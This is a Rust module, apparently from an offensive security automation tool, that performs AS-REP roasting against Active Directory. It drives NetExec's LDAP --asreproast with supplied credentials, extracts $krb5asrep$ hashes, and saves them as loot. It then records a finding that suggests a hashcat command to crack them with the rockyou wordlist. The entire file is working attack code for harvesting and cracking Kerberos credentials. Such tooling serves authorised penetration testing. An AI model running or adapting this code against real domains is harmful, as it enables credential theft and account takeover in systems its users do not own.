//! AS-REP roasting via NetExec LDAP (`--asreproast`). Collects `$krb5asrep$`
//! hashes for accounts that don't require Kerberos pre-auth and raises a finding
//! with the hashcat command to crack them.

use std::sync::Arc;

use serde_json::json;

use crate::db::repository;
use crate::models::{Finding, Job};
use crate::state::AppState;

use super::ad_kerberoast::parse_hashes;
use super::nxc_common::{
    active_engagement_id, record_fact, record_finding, require_nxc, run_nxc, save_loot,
};

pub struct AdAsrep;

impl AdAsrep {
    pub async fn run(job: &Job, state: &Arc<AppState>) -> Result<String, String> {
        let cfg = job.config.as_object().ok_or("Invalid job config")?;
        let target = job.target()?;
        let user = cfg.get("username").and_then(|v| v.as_str()).ok_or("config.username required")?;
        let pass = cfg.get("password").and_then(|v| v.as_str()).ok_or("config.password required")?;
        let domain = cfg.get("domain").and_then(|v| v.as_str()).unwrap_or("");
        let bin = require_nxc(state, &job.id, "ad-asrep").await?;

        let outfile = std::env::temp_dir().join(format!("decebalus_asrep_{}.txt", job.id));
        let mut args = vec![
            "ldap".to_string(),
            target.clone(),
            "-u".to_string(),
            user.to_string(),
            "-p".to_string(),
            pass.to_string(),
            "--asreproast".to_string(),
            outfile.to_string_lossy().to_string(),
        ];
        if !domain.is_empty() {
            args.push("-d".to_string());
            args.push(domain.to_string());
        }

        let _ = state.broadcaster.send(format!("scan_progress:{}:AS-REP roasting on {}", job.id, target));
        let out = run_nxc(bin, &args, 300).await?;
        let file_text = tokio::fs::read_to_string(&outfile).await.unwrap_or_default();
        let _ = tokio::fs::remove_file(&outfile).await;

        let combined = format!("{}\n{}", out.stdout, file_text);
        let hashes = parse_hashes(&combined, "$krb5asrep$");

        let eng = active_engagement_id(state).await;
        record_fact(state, &eng, &job.id, "host", &target, "asrep_roastable", json!(hashes.len())).await;

        let mut loot_path = String::new();
        if !hashes.is_empty() {
            loot_path = save_loot(&target, "asrep.txt", hashes.join("\n").as_bytes())
                .await
                .unwrap_or_default();

            let mut f = Finding::new(
                format!("asrep:{}", target),
                format!("{} AS-REP roastable account(s) on {}", hashes.len(), target),
            );
            f.engagement_id = eng.clone();
            f.category = "ad".into();
            f.severity = "high".into();
            f.value_score = 72;
            f.rationale = "Accounts without Kerberos pre-auth allow offline AS-REP cracking with no credentials.".into();
            f.suggested_command = Some(format!("hashcat -m 18200 {} /usr/share/wordlists/rockyou.txt --force", loot_path));
            f.status = "done".into();
            f.evidence = json!({ "target": target, "hashes": hashes.len(), "loot": loot_path });
            record_finding(state, &f).await;
        }

        let msg = format!("AS-REP roast on {}: {} hash(es)", target, hashes.len());
        let _ = repository::add_log(&state.db, "INFO", "attacks", Some("ad-asrep"), Some(&job.id), &msg).await;
        let _ = state.broadcaster.send(format!("scan_progress:{}:{}", job.id, msg));

        Ok(json!({ "target": target, "hashes": hashes.len(), "loot": loot_path }).to_string())
    }
}
